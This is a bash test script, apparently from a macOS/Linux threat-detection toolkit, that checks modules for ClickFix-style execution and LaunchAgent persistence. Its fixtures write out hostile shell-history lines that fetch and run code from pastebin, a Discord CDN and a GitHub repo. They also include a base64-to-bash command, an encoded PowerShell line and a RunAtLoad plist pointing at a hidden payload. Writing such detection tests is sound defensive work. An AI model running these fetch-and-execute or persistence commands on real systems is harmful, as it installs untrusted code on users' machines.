#!/usr/bin/env bash
set -e
source "$(dirname "$0")/helpers.sh"
PASS=0; FAIL=0
run_check(){ local name="$1" module="$2" match="$3"; output=$(bash "$module" 2>&1) || true
if echo "$output" | grep -Eqi "$match"; then echo "  [PASS] $name"; PASS=$((PASS+1))
else echo "  [FAIL] $name"; FAIL=$((FAIL+1)); fi
teardown_sandbox; }

echo "=== ClickFix / InstallFix Scenario Test ==="

setup_sandbox
cat > "$SANDBOX/.zsh_history" <<'HIST'
: 1700000000:0;curl -sSL https://raw.githubusercontent.com/malicious/repo/main/install.sh | bash
: 1700000001:0;echo "aW5zdGFsbC1tYWx3YXJl" | base64 -d | bash
: 1700000002:0;/bin/bash -c "$(curl -fsSL https://pastebin.com/raw/abc123)"
HIST
run_check "Shell history curl|bash detection" "$REPO_ROOT/modules/execution/T1059.004-unix-shell.sh" 'T1059.004|suspicious|curl.*bash|pastebin'

setup_sandbox
cat > "$SANDBOX/.bash_history" <<'HIST'
/bin/bash -c "$(curl -fsSL https://cdn.discordapp.com/attachments/123/456/install.sh)"
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
HIST
run_check "ClickFix detection" "$REPO_ROOT/modules/execution/T1204.001-clickfix.sh" 'T1204.001|clickfix|clipboard|paste'

setup_sandbox
mkdir -p "$SANDBOX/Library/LaunchAgents"
cat > "$SANDBOX/Library/LaunchAgents/com.installfix.update.plist" <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.installfix.update</string>
    <key>ProgramArguments</key>
    <array><string>/tmp/.payload/runner</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>
PLIST
run_check "Persistence from ClickFix payload" "$REPO_ROOT/modules/persistence/T1543.001-launch-agent.sh" 'T1543.001|launch.*agent|installfix|suspicious'

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
